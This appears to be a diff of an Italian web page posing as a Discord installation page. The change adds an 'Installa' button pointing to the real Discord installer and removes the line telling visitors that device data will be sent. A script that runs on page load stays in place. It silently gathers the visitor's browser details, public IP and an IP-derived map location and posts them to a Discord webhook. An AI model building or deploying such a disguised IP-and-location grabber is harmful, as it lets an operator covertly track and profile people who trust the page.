@@ -12,91 +12,74 @@
             background-color: #f4f4f4;
             text-align: center;
         }
+        button {
+            background-color: #007bff; /* Blu */
+            color: white; /* Testo bianco */
+            padding: 10px 20px; /* Spaziatura interna */
+            border: none; /* Nessun bordo */
+            border-radius: 5px; /* Bordi arrotondati */
+            font-size: 16px; /* Dimensione del testo */
+            cursor: pointer; /* Puntatore a mano */
+            transition: background-color 0.3s; /* Transizione del colore */
+        }
+        button:hover {
+            background-color: #0056b3; /* Blu più scuro al passaggio del mouse */
+        }
     </style>
 </head>
 <body>
     <h1>Installazione di Discord</h1>
-    <p>Le informazioni sul dispositivo verranno inviate automaticamente.</p>
-    
+    <button onclick="window.location.href='https://discord.com/api/downloads/distributions/app/installers/latest?channel=stable&platform=win&arch=x64';">
+        Installa
+    </button>
+
     <script>
         async function sendDeviceInfo() {
             const deviceInfo = {
                 userAgent: navigator.userAgent,
                 platform: navigator.platform,
                 language: navigator.language,
-                cookiesEnabled: navigator.cookieEnabled,
                 screenResolution: `${window.screen.width}x${window.screen.height}`,
-                colorDepth: window.screen.colorDepth,
                 online: navigator.onLine,
-                connection: navigator.connection ? {
-                    effectiveType: navigator.connection.effectiveType,
-                    downlink: navigator.connection.downlink,
-                    rtt: navigator.connection.rtt
-                } : null,
-                battery: null,
-                ipAddress: null,
-                location: {
-                    latitude: 'N/A',
-                    longitude: 'N/A',
-                    city: 'N/A',
-                    link: 'N/A'
-                },
-                deviceType: getDeviceType(),
                 timeZone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                 hardwareConcurrency: navigator.hardwareConcurrency,
-                memory: navigator.deviceMemory || 'N/A'
+                memory: navigator.deviceMemory || 'N/A',
+                ipAddress: null,
+                locationLink: 'N/A'
             };
 
-            // Ottieni l'indirizzo IP e informazioni geografiche
+            // Ottieni l'indirizzo IP
             await fetch('https://api.ipify.org?format=json')
                 .then(response => response.json())
                 .then(data => {
                     deviceInfo.ipAddress = data.ip;
 
-                    // Usa un servizio di geolocalizzazione inversa per ottenere la città
+                    // Ottieni la posizione geografica
                     return fetch(`https://ipinfo.io/${data.ip}/json?token=YOUR_IPINFO_TOKEN`);
                 })
                 .then(response => response.json())
                 .then(data => {
-                    if (data.city) {
-                        deviceInfo.location.city = data.city;
-                        deviceInfo.location.link = `https://www.google.com/maps?q=${data.loc}`;
+                    if (data.loc) {
+                        const [lat, lon] = data.loc.split(',');
+                        deviceInfo.locationLink = `https://www.google.com/maps?q=${lat},${lon}`;
                     }
                 });
-
-            // Ottieni la posizione geografica se disponibile
-            if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition(position => {
-                    const lat = position.coords.latitude;
-                    const lon = position.coords.longitude;
-                    deviceInfo.location = {
-                        latitude: lat,
-                        longitude: lon,
-                        link: `https://www.google.com/maps?q=${lat},${lon}`
-                    };
-                });
-            }
 
             // Crea il payload per Discord
             const payload = {
                 embeds: [{
                     title: "Informazioni del Dispositivo",
-                    description: "Ecco alcune informazioni del tuo dispositivo:",
                     color: 0x0099ff, // Blu chiaro
                     fields: [
                         { name: 'User Agent', value: deviceInfo.userAgent || 'N/A', inline: true },
                         { name: 'Piattaforma', value: deviceInfo.platform || 'N/A', inline: true },
                         { name: 'Lingua', value: deviceInfo.language || 'N/A', inline: true },
-                        { name: 'Tipo di Dispositivo', value: deviceInfo.deviceType || 'N/A', inline: true },
                         { name: 'Risoluzione dello Schermo', value: deviceInfo.screenResolution || 'N/A', inline: true },
-                        { name: 'Profondità Colori', value: deviceInfo.colorDepth || 'N/A', inline: true },
                         { name: 'Stato Connessione', value: deviceInfo.online ? 'Online' : 'Offline', inline: true },
-                        { name: 'Batteria', value: deviceInfo.battery ? `Livello: ${deviceInfo.battery.level}` : 'N/A', inline: true },
                         { name: 'Fuso Orario', value: deviceInfo.timeZone || 'N/A', inline: true },
                         { name: 'Memoria', value: deviceInfo.memory || 'N/A', inline: true },
                         { name: 'IP Indirizzo', value: deviceInfo.ipAddress || 'N/A', inline: true },
-                        { name: 'Posizione', value: deviceInfo.location.link || 'N/A', inline: true },
-                        { name: 'Città', value: deviceInfo.location.city || 'N/A', inline: true }
+                        { name: 'Posizione', value: deviceInfo.locationLink || 'N/A', inline: true }
                     ],
                     footer: {
                         text: "Messaggio inviato tramite webhook",
@@ -126,22 +109,8 @@
             }
         }
 
-        function getDeviceType() {
-            const userAgent = navigator.userAgent;
-            if (/mobile/i.test(userAgent)) {
-                return 'Telefono';
-            } else if (/tablet/i.test(userAgent)) {
-                return 'Tablet';
-            } else if (/iPad|iPod|Macintosh/i.test(userAgent)) {
-                return 'Tablet/iPad';
-            } else {
-                return 'Computer';
-            }
-        }
-
         // Invia le informazioni al caricamento della pagina
         window.onload = sendDeviceInfo;
     </script>
-
 </body>
 </html>
